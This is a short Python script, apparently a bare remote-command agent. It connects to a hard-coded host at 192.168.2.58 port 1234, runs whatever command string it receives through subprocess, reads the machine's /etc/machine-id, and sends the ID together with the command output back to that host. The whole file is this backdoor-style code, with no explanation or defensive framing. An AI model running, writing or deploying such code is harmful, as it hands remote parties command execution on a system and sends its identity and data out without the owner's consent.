


import socket
import subprocess
import os

ipAddr = '192.168.2.58'
port = 1234
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ipAddr, port))
srvMsg = s.recv(1024).decode()
cmdOut = (subprocess.check_output(srvMsg)).strip()
f = open("/etc/machine-id", "r")
cmdId = (f.read()).strip() 
infoSend = str(cmdId) + ":" + str(cmdOut.decode())
s.send(infoSend.encode())